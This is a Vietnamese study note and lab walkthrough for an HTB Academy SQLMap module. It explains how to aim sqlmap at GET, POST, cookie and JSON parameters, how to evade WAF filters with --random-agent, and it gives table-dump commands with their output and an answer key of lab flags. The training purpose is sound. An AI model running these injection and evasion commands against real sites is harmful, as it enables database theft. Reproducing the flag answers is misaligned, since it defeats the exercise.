# Chạy SQLMap Trên Một HTTP Request (Running SQLMap on an HTTP Request)

> **HTB Academy Module 58: SQLMap Essentials - Section 4 / 11**  
> *Đường dẫn bài học: `02-building-attacks/01-running-sqlmap-on-an-http-request.md`*

---

## 1. Tầm Quan Trọng Của Việc Thiết Lập Chuẩn HTTP Request

Trong thực tế kiểm thử xâm nhập ứng dụng web, việc khai thác thất bại thường không phải do ứng dụng không có lỗi, mà do **pentester cấu hình sai cấu trúc của HTTP Request gửi đi**:
* Quên truyền Cookie xác thực phiên đăng nhập (khiến server trả về 302 Redirect hoặc 403 Forbidden).
* Định dạng sai dữ liệu POST (POST body) phức tạp.
* Gõ dòng lệnh quá dài dẫn đến lỗi parse ký tự trên terminal.

SQLMap cung cấp các giải pháp cực kỳ linh hoạt để nắm bắt và tái tạo lại 100% nguyên vẹn một HTTP Request.

---

## 2. Kỹ Thuật Sao Chép Dưới Dạng cURL (Copy as cURL)

Một trong những cách nhanh nhất và chính xác nhất để chạy SQLMap đối với một request phức tạp trên trình duyệt (Chrome, Firefox, Edge):
1. Bấm phím **F12** để mở **Developer Tools** $\rightarrow$ Chọn tab **Network**.
2. Thực hiện hành động gửi form/click trên trang web.
3. Nhấp chuột phải vào request tương ứng $\rightarrow$ Chọn **Copy** $\rightarrow$ **Copy as cURL**.
4. Dán vào terminal, sau đó chỉ cần **thay chữ `curl` ban đầu bằng `sqlmap`**:

```bash
sqlmap 'http://www.example.com/?id=1' \
  -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' \
  -H 'Accept: image/webp,*/*' \
  -H 'Accept-Language: en-US,en;q=0.5' \
  --compressed \
  -H 'Connection: keep-alive' \
  -H 'DNT: 1'
```

---

## 3. Khai Thác Tham Số GET và POST

### 3.1. Truy Vấn GET
Đối với phương thức GET, các tham số nằm trực tiếp trên URL sau dấu `?`. Ta dùng cờ `-u`:
```bash
sqlmap -u "http://www.example.com/?id=1"
```

### 3.2. Truy Vấn POST Với Cờ `--data`
Đối với các form đăng nhập, tìm kiếm gửi dữ liệu qua phương thức POST trong body, sử dụng cờ `--data`:
```bash
sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
```

### 3.3. Thu Hẹp Điểm Tiêm Với Dấu Hoa Thị `*` (Custom Injection Marker)
Bình thường SQLMap sẽ lần lượt kiểm tra tất cả các tham số (`uid`, `name`). Để ép SQLMap **chỉ tập trung tấn công đúng một tham số duy nhất** nhằm tiết kiệm thời gian:
* Dùng cờ `-p`: `-p uid`
* Hoặc đặt **dấu hoa thị `*`** ngay phía sau giá trị cần tiêm:
```bash
sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'
```

---

## 4. Nạp Toàn Bộ Raw HTTP Request Từ File (`-r req.txt`)

Khi request chứa quá nhiều Headers phức tạp, CSRF token, Cookie dài, hoặc POST body dạng JSON/XML, việc gõ lệnh trên terminal rất dễ bị lỗi escape ký tự. Giải pháp chuyên nghiệp nhất của Pentester là dùng **cờ `-r`**:

### Cách Làm Với Burp Suite:
1. Bắt request mục tiêu trong tab **Proxy** $\rightarrow$ **HTTP history** của Burp Suite.
2. Chuột phải vào request $\rightarrow$ Chọn **Copy to file** (hoặc bôi đen toàn bộ raw request copy vào một file văn bản đặt tên là `req.txt`).

```http
GET /?id=1 HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
DNT: 1
If-Modified-Since: Thu, 17 Oct 2019 07:18:26 GMT
If-None-Match: "3147526947"
Cache-Control: max-age=0
```

3. Chạy SQLMap với file request đó:
```bash
sqlmap -r req.txt --batch
```

> [!TIP]
> Bạn hoàn toàn có thể đặt dấu hoa thị `*` ngay bên trong file `req.txt` (ví dụ: `GET /?id=1* HTTP/1.1` hoặc trong Cookie/Header) để chỉ định chính xác vị trí muốn SQLMap tấn công!

---

## 5. Tùy Biến Headers & Bypass Bộ Lọc Nhận Diện

* **Thiết lập Cookie**:
  ```bash
  sqlmap -u "http://target.com/" --cookie="PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c"
  # Hoặc dùng cờ -H
  sqlmap -u "http://target.com/" -H="Cookie: PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c"
  ```
* **Bypass nhận diện bằng `--random-agent`**:
  * Mặc định User-Agent của SQLMap là: `User-agent: sqlmap/1.4.9 (http://sqlmap.org)`.
  * Hầu hết các WAF/IDS hiện đại sẽ tự động chặn đứng ngay lập tức các request có chứa chuỗi `sqlmap`.
  * Thêm cờ **`--random-agent`** sẽ khiến SQLMap tự động chọn ngẫu nhiên User-Agent của Chrome/Firefox thật để vượt qua bộ lọc.
* **Giả lập điện thoại di động**: Dùng cờ `--mobile`.
* **Thay đổi phương thức HTTP**: Dùng cờ `--method PUT` hoặc `--method DELETE`.

---

## 6. Khai Thác Định Dạng Dữ Liệu Tùy Biến (JSON / XML)

SQLMap hỗ trợ giải mã tự nhiên dữ liệu JSON (`{"id": 1}`) và XML (`<id>1</id>`):
* Với JSON đơn giản:
  ```bash
  sqlmap -u "http://target.com/api" --data='{"id":1}' -H "Content-Type: application/json"
  ```
* Với JSON phức tạp: Lưu toàn bộ vào file `req.txt` rồi chạy `sqlmap -r req.txt`. SQLMap sẽ tự động in ra dòng thông báo:
  ```text
  [INFO] parsing HTTP request from 'req.txt'
  JSON data found in HTTP body. Do you want to process it? [Y/n/q] Y
  ```

---

## 7. Bài Tập Thực Chiến Lab Tương Tác (HTB Walkthrough)

Sau khi nhấn **Spawn the target system**, bạn sẽ nhận được địa chỉ IP và Port của máy mục tiêu: `http://<TARGET_IP>:<PORT>/`.

---

### 🎯 Case #2 (Question 1): Khai Thác Tham Số POST Body
* **Đề bài**: Lấy nội dung của bảng `flag2`.
* **Phân tích mục tiêu**: Trang `case2.php` nhận dữ liệu qua phương thức POST (form gửi tham số `id`).
* **Lệnh khai thác với SQLMap**:
  ```bash
  sqlmap -u "http://<TARGET_IP>:<PORT>/case2.php" --data="id=1*" --method POST -T flag2 --dump --batch
  ```
* **Kết quả trích xuất**:
  ```text
  Database: testdb
  Table: flag2
  [1 entry]
  +----+-----------------------------------------+
  | id | flag                                    |
  +----+-----------------------------------------+
  | 1  | HTB{700_much_c0n6r475_0n_p057_r3qu357}  |
  +----+-----------------------------------------+
  ```
* 👉 **Flag 2**: `HTB{700_much_c0n6r475_0n_p057_r3qu357}`

---

### 🎯 Case #3 (Question 2): Khai Thác Cookie Injection
* **Đề bài**: Lấy nội dung của bảng `flag3`.
* **Phân tích mục tiêu**: Trang `case3.php` nhận giá trị điểm tiêm nằm ngay bên trong HTTP Cookie (`Cookie: id=1`).
* **Lệnh khai thác với SQLMap**:
  ```bash
  sqlmap -u "http://<TARGET_IP>:<PORT>/case3.php" --cookie="id=1*" -T flag3 --dump --batch
  ```
* **Kết quả trích xuất**:
  ```text
  Database: testdb
  Table: flag3
  [1 entry]
  +----+-----------------------------------------+
  | id | flag                                    |
  +----+-----------------------------------------+
  | 1  | HTB{c00k13_m0n573r_15_7h1nk1n6_0f_6r475}|
  +----+-----------------------------------------+
  ```
* 👉 **Flag 3**: `HTB{c00k13_m0n573r_15_7h1nk1n6_0f_6r475}`

---

### 🎯 Case #4 (Question 3): Khai Thác Dữ Liệu POST Dạng JSON
* **Đề bài**: Lấy nội dung của bảng `flag4`.
* **Phân tích mục tiêu**: Trang `case4.php` nhận body dưới dạng JSON: `{"id": 1}` với header `Content-Type: application/json`.
* **Lệnh khai thác với SQLMap**:
  ```bash
  sqlmap -u "http://<TARGET_IP>:<PORT>/case4.php" \
    -H "Content-Type: application/json" \
    --data='{"id": 1*}' \
    -T flag4 --dump --batch
  ```
* **Kết quả trích xuất**:
  ```text
  Database: testdb
  Table: flag4
  [1 entry]
  +----+-----------------------------------------+
  | id | flag                                    |
  +----+-----------------------------------------+
  | 1  | HTB{j450n_v00rh335_53nd5_6r475}         |
  +----+-----------------------------------------+
  ```
* 👉 **Flag 4**: `HTB{j450n_v00rh335_53nd5_6r475}`

---

## 8. Bảng Tổng Hợp Đáp Án Checkpoint (Official Solutions Matrix)

| STT | Câu Hỏi (HTB Academy) | Kỹ Thuật Khai Thác | Đáp Án Điền Hệ Thống |
| :---: | :--- | :--- | :---: |
| **Q1** | *What's the contents of table flag2? (Case #2)* | Khai thác tham số POST body (`--data="id=1*"`) | **`HTB{700_much_c0n6r475_0n_p057_r3qu357}`** |
| **Q2** | *What's the contents of table flag3? (Case #3)* | Khai thác Header Cookie (`--cookie="id=1*"`) | **`HTB{c00k13_m0n573r_15_7h1nk1n6_0f_6r475}`** |
| **Q3** | *What's the contents of table flag4? (Case #4)* | Khai thác JSON POST Body (`--data='{"id": 1*}'`) | **`HTB{j450n_v00rh335_53nd5_6r475}`** |

---
*Edit by me and AI.*
